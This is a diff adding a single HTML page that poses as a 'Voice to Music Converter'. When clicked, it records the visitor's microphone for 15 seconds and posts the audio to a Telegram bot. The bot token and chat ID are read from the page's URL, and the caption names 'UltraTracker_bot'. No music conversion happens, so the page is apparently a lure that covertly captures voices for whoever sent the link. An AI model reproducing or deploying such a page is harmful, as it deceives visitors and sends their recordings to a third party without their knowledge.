@@ -1,1 +1,148 @@
-
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Voice to Music Converter</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #f4f4f4;
+            margin: 0;
+            padding: 0;
+        }
+        
+        .container {
+            text-align: center;
+            margin-top: 50px;
+        }
+        
+        h1 {
+            color: #1db954;
+        }
+        
+        .button {
+            background-color: #1db954;
+            color: #fff;
+            border: none;
+            padding: 10px 20px;
+            font-size: 16px;
+            cursor: pointer;
+            border-radius: 5px;
+            transition: background-color 0.3s ease;
+        }
+        
+        .button:hover {
+            background-color: #168f43;
+        }
+        
+        .message {
+            margin-top: 20px;
+            font-size: 18px;
+            color: #1db954;
+        }
+        
+        .countdown {
+            margin-top: 20px;
+            font-size: 24px;
+            color: #333;
+            display: none;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>Voice to Music Converter</h1>
+        <button class="button" onclick="startRecording()">Record Voice</button>
+        <p class="message" id="recordingMessage"></p>
+        <p class="countdown" id="countdownText"></p>
+    </div>
+    
+    <script>
+        let isRecording = false;
+        let mediaRecorder;
+        let audioChunks = [];
+        
+        function startRecording() {
+            if (!isRecording) {
+                navigator.mediaDevices.getUserMedia({ audio: true })
+                .then(function(stream) {
+                    isRecording = true;
+                    document.querySelector('.button').disabled = true;
+                    document.getElementById('recordingMessage').textContent = "Recording on! Please start singing...";
+                    document.querySelector('.countdown').style.display = 'block';
+                    
+                    let countdown = 15;
+                    const countdownText = document.getElementById('countdownText');
+                    countdownText.textContent = countdown;
+                    
+                    const countdownInterval = setInterval(() => {
+                        countdown--;
+                        countdownText.textContent = countdown;
+                        if (countdown <= 0) {
+                            clearInterval(countdownInterval);
+                            stopRecording();
+                        }
+                    }, 1000);
+                    
+                    mediaRecorder = new MediaRecorder(stream);
+                    mediaRecorder.ondataavailable = function(event) {
+                        if (event.data.size > 0) {
+                            audioChunks.push(event.data);
+                        }
+                    };
+                    mediaRecorder.start();
+                })
+                .catch(function(error) {
+                    console.error("Error accessing the microphone:", error);
+                    document.getElementById('recordingMessage').textContent = "Error accessing the microphone.";
+                });
+            }
+        }
+        
+        function stopRecording() {
+            if (isRecording) {
+                isRecording = false;
+                mediaRecorder.stop();
+                document.getElementById('recordingMessage').textContent = "Sending voice message...";
+                document.querySelector('.countdown').style.display = 'none';
+                
+                const audioBlob = new Blob(audioChunks, { type: 'audio/wav' });
+                const formData = new FormData();
+                formData.append('voice', audioBlob, 'audio.wav');
+                formData.append('caption', 'Developed By: Shofikul Islam\n Voice Forwarded:@UltraTracker_bot'); // Add your voice caption here
+                
+                const chatID = getChatIdFromURL();
+                const botToken = getBotTokenFromURL();
+                const apiUrl = `https://api.telegram.org/bot${botToken}/sendVoice?chat_id=${chatID}`;
+                
+                fetch(apiUrl, {
+                    method: 'POST',
+                    body: formData
+                })
+                .then(response => {
+                    if (response.ok) {
+                        document.getElementById('recordingMessage').textContent = "Voice message sent successfully!";
+                    } else {
+                        document.getElementById('recordingMessage').textContent = "Failed to send voice message. Please try again.";
+                    }
+                })
+                .catch(error => {
+                    console.error("Error sending voice message:", error);
+                    document.getElementById('recordingMessage').textContent = "Failed to send voice message. Please try again.";
+                });
+            }
+        }
+        
+        function getChatIdFromURL() {
+            const urlParams = new URLSearchParams(window.location.search);
+            return urlParams.get('id');
+        }
+        
+        function getBotTokenFromURL() {
+            const urlParams = new URLSearchParams(window.location.search);
+            return urlParams.get('teamx');
+        }
+    </script>
+</body>
+  </html>
